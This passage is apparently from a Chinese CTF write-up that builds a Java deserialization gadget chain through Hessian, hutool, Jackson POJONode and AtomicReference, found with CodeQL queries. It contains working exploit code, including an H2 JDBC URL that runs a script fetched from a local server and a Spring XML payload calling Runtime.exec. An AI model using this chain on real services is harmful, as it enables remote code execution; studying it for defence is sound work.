class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\">setting.put(<span class=\"string\">&quot;initialSize&quot;</span>, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\">pooledDSFactory.getDataSource().getConnection();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(pooledDSFactory);</span><br><span class=\"line\">pojoNode.toString();</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"toString-gadget\"><a href=\"#toString-gadget\" class=\"headerlink\" title=\"toString gadget\"></a>toString gadget</h2><p>知道source和sink之后其实我们就可以进行查询了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">@kind</span> path-problem</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Source()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().matches(<span class=\"string\">&quot;put&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%hutool%&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getNumberOfParameters() = <span class=\"number\">2</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;toString&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">0</span> <span class=\"comment\">// this.hasNoParameters()</span></span><br><span class=\"line\">            and</span><br><span class=\"line\">            <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getQualifiedName().matches(<span class=\"string\">&quot;%hutool%&quot;</span>)</span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller() </span><br><span class=\"line\">        ) and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n<p>挑选一个。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png\"  alt=\"image-20241213225124321\" lazyload></a></p>\n<p>我们现在的目标就是put到toString<br>然后就在hutools里面找找到了一个 JSONObject</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wrap:800, JSONUtil (cn.hutool.json)</span><br><span class=\"line\">set:393, JSONObject (cn.hutool.json)</span><br><span class=\"line\">set:352, JSONObject (cn.hutool.json)</span><br><span class=\"line\">put:340, JSONObject (cn.hutool.json)</span><br><span class=\"line\">put:32, JSONObject (cn.hutool.json)</span><br></pre></td></tr></table></figure>\n\n<p>但是是有要求的。而且必须是jdk原生类才行。<br><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png\"  alt=\"image-20241209172907925\" lazyload></a></p>\n<h2 id=\"AtomicReference\"><a href=\"#AtomicReference\" class=\"headerlink\" title=\"AtomicReference\"></a>AtomicReference</h2><p>然后我们查找，发现有一个 。这个结果其实听过的，我过滤的这么严格，最后还能有700多个结果。过滤的不太严格的话电脑就直接卡死了。我感觉可以利用的应该挺多的。</p>\n<p>别忘了 dockerfile 里面还有一个这样的一个参数  <code>--add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED</code> 所以我们筛选原生类的时候也可以缩小一些范围。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">@kind</span> path-problem</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"><span class=\"keyword\">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Source</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123; </span><br><span class=\"line\">    Source()&#123;  <span class=\"comment\">// java.util.concurrent.atomic.AtomicReference</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.concurrent.atomic.AtomicReference%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeNumber and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;cn.hutool.json.JSON%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.lang.CharSequence%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.sql.SQLException%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Map%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Date%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.util.Calendar%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.time.temporal.TemporalAccessor%&quot;</span>) and</span><br><span class=\"line\">        not <span class=\"built_in\">this</span>.getQualifiedName().matches(<span class=\"string\">&quot;java.lang.Enum%&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getName().matches(<span class=\"string\">&quot;toString&quot;</span>) and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isPublic() and</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.getNumberOfParameters() = <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sink</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Method</span>&#123;</span><br><span class=\"line\">    Sink()&#123;</span><br><span class=\"line\">        exists(MethodAccess ac|  </span><br><span class=\"line\">            ac.getMethod().getName().matches(<span class=\"string\">&quot;toString&quot;</span>)</span><br><span class=\"line\">            and</span><br><span class=\"line\">            ac.getMethod().getNumberOfParameters() = <span class=\"number\">0</span> <span class=\"comment\">// this.hasNoParameters()</span></span><br><span class=\"line\">            <span class=\"type\">and</span> </span><br><span class=\"line\">            <span class=\"variable\">this</span> <span class=\"operator\">=</span> ac.getCaller()</span><br><span class=\"line\">        ) and</span><br><span class=\"line\">        <span class=\"title function_\">getDeclaringType</span><span class=\"params\">()</span>.getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">query predicate <span class=\"title function_\">edges</span><span class=\"params\">(Method a, Method b)</span> &#123; </span><br><span class=\"line\">    a.polyCalls(b)and</span><br><span class=\"line\">    (a.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or a.isStatic()) and</span><br><span class=\"line\">    (b.getDeclaringType().getASupertype*() <span class=\"keyword\">instanceof</span> TypeSerializable or b.isStatic()) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from Source source, Sink sink</span><br><span class=\"line\">where edges+(source, sink)</span><br><span class=\"line\">select source, source, sink, <span class=\"string\">&quot;$@ $@ to $@ $@&quot;</span> ,</span><br><span class=\"line\">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class=\"line\">source,source.getName(),</span><br><span class=\"line\">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class=\"line\">sink,sink.getName()</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png\"  alt=\"image-20241214002242218\" lazyload></a></p>\n<p>AtomicReference  这个类的toString方法，会调用自身value属性的toString。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:h2:mem:test;init=runscript from &#x27;http://localhost:7777/poc.sql&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Setting</span> <span class=\"variable\">setting</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Setting</span>();</span><br><span class=\"line\">setting.set(<span class=\"string\">&quot;url&quot;</span>,url);</span><br><span class=\"line\"><span class=\"type\">PooledDSFactory</span> <span class=\"variable\">pooledDSFactory</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PooledDSFactory</span>(setting);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//  pooledDSFactory.getDataSource();</span></span><br><span class=\"line\"><span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">ClassPool.getDefault().appendClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(ctMethod);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">pojoNode</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(pooledDSFactory);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//   pojoNode.toString();</span></span><br><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">object</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AtomicReference</span>&lt;&gt;(pojoNode);</span><br><span class=\"line\"><span class=\"comment\">//   object.toString();</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">JSONObject</span> <span class=\"variable\">jsonObject</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\">jsonObject.put(<span class=\"string\">&quot;aaa&quot;</span>,object);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"unsafe-allocateInstance\"><a href=\"#unsafe-allocateInstance\" class=\"headerlink\" title=\"unsafe.allocateInstance\"></a>unsafe.allocateInstance</h2><p>PooledDSFactory pooledDSFactory &#x3D; new PooledDSFactory(setting);</p>\n<p>这样实例化出来的 pooledDSFactory 是无法被序列化的。</p>\n<p>Unsafe中提供allocateInstance方法，仅通过Class对象就可以创建此类的实例对象，而且不需要调用其构造函数、初始化代码、JVM安全检查等</p>\n<h2 id=\"writeMapBegin\"><a href=\"#writeMapBegin\" class=\"headerlink\" title=\"writeMapBegin\"></a>writeMapBegin</h2><p>为什么要用这种方法将 JSONObject 写入进去。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hessian2Output.writeMapBegin(JSONObject.class.getName());</span><br><span class=\"line\">hessian2Output.writeObject(<span class=\"string\">&quot;whatever&quot;</span>);</span><br><span class=\"line\">hessian2Output.writeObject(object);</span><br><span class=\"line\">hessian2Output.writeMapEnd();</span><br><span class=\"line\">hessian2Output.close();</span><br></pre></td></tr></table></figure>\n\n<p>因为会提前触发put方法，导致 entries 的value没有值。上面那个其实就相当于构造一个map，然后kay和value分别是”whatever” 和 object。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">JSONObject</span> <span class=\"variable\">entries</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JSONObject</span>();</span><br><span class=\"line\">entries.put(<span class=\"string\">&quot;aaa&quot;</span>,object);</span><br><span class=\"line\">hessian2Output.writeObject(entries);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Bean\"><a href=\"#Bean\" class=\"headerlink\" title=\"Bean\"></a>Bean</h2><p>这个地方为什么要套上一层Bean</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Bean</span> <span class=\"variable\">bean</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Bean</span>();</span><br><span class=\"line\">bean.setData(SerializeUtil.serialize(pooledDSFactory));</span><br></pre></td></tr></table></figure>\n\n<p>问题就在于JavaDeserializer实例化PooledDSFactory的时候调用的是无参构造。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png\"  alt=\"image-20241213175724894\" lazyload></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">createDbSetting:87, GlobalDbConfig (cn.hutool.db)</span><br><span class=\"line\">&lt;init&gt;:50, AbstractDSFactory (cn.hutool.db.ds)</span><br><span class=\"line\">&lt;init&gt;:25, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class=\"line\">&lt;init&gt;:21, PooledDSFactory (cn.hutool.db.ds.pooled)</span><br><span class=\"line\">instantiate:313, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class=\"line\">readObject:202, JavaDeserializer (com.alibaba.com.caucho.hessian.io)</span><br></pre></td></tr></table></figure>\n\n<p>若是无参构造，走到这里的时候会去加载配置文件。然后没有配置文件的话就会抛出异常报错。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png\"  alt=\"image-20241213175938825\" lazyload></a></p>\n<h2 id=\"POJONode\"><a href=\"#POJONode\" class=\"headerlink\" title=\"POJONode\"></a>POJONode</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getDataSource:62, DSFactory (cn.hutool.db.ds)</span><br><span class=\"line\">invoke:568, Method (java.lang.reflect)</span><br><span class=\"line\">serializeAsField:688, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class=\"line\">serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeAsField:732, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class=\"line\">serializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class=\"line\">serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br></pre></td></tr></table></figure>\n\n<p>看最后的那几步。</p>\n<p>套一层Bean和没有多套那一层Bean多了最后那重复的三步。其实就是多了一个递归调用。</p>\n<p>首先在这个地方找到value对应的Serializer，然后进行serialize。</p>\n<p>SerializerProvider.defaultSerializeValue()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png\"  alt=\"image-20241213215330708\" lazyload></a></p>\n<p>然后是获取对应的File。</p>\n<p>BeanSerializer.serialize()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png\"  alt=\"image-20241213215621613\" lazyload></a></p>\n<p>然后通过反射调用对应的get方法。然后get到对应的value。此时的value就已经是PooledDSFactory了。然后再进行一次这样的步骤，调用PooledDSFactory的任意get方法。</p>\n<p>BeanPropertyWriter.serializeAsField()</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png\"  alt=\"image-20241213215902133\" lazyload></a></p>\n<h1 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h1><h2 id=\"sink\"><a href=\"#sink\" class=\"headerlink\" title=\"sink\"></a>sink</h2><p>poc.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span>  </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;evil&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.String&quot;</span>&gt;</span>  </span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;#&#123;T(Runtime).getRuntime().exec(&#x27;open -a Calculator&#x27;)&#125;&quot;</span>/&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:7777/poc.xml&quot;);</span><br></pre></td></tr></table></figure>\n<p>这样我们就可以达到命令执行的效果。然后我们就是如何来实例化这个类。</p>\n<h2 id=\"中间链思路\"><a href=\"#中间链思路\" class=\"headerlink\" title=\"中间链思路\"></a>中间链思路</h2><p>其实可以利用   EventListenerList ReadObject -&gt; toString 这个gadget。</p>\n<p><a href=\"https://xz.aliyun.com/t/15487\">https://xz.aliyun.com/t/15487</a>  今年羊城杯的时候遇到过。</p>\n<p>然后再利用jackson  toString -&gt; 任意get的这个gadget<br>然后寻找  任意get -&gt;  newInstance 这个 gadget 。这个链子我们用codeql寻找。</p>\n<p>然后我们以任意的get方法作为source，以 newInstance 方法作为sink点。进行查找。</p>\n<h2 id=\"codeql\"><a href=\"#codeql\" class=\"headerlink\" title=\"codeql\"></a>codeql</h2><p>经过codeql查询之后我们构建如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 